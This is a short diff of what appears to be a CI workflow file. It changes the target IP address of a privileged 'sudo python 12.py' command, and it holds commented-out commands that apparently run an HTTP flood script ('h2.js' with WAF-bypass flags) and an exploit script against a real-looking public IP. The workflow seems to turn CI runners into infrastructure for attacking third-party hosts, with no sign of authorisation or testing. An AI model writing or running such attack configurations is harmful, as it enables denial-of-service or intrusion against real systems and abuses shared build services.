@@ -18,4 +18,4 @@ jobs:
         run: |
           # node h2.js http://103.43.8.135 21000 12 5 1000 GET --waf --mode full
           # python3 exploit-test.py 103.43.8.135 80 --no-ssl
-          sudo python 12.py 103.43.8.135 80
+          sudo python 12.py 103.116.247.42 80
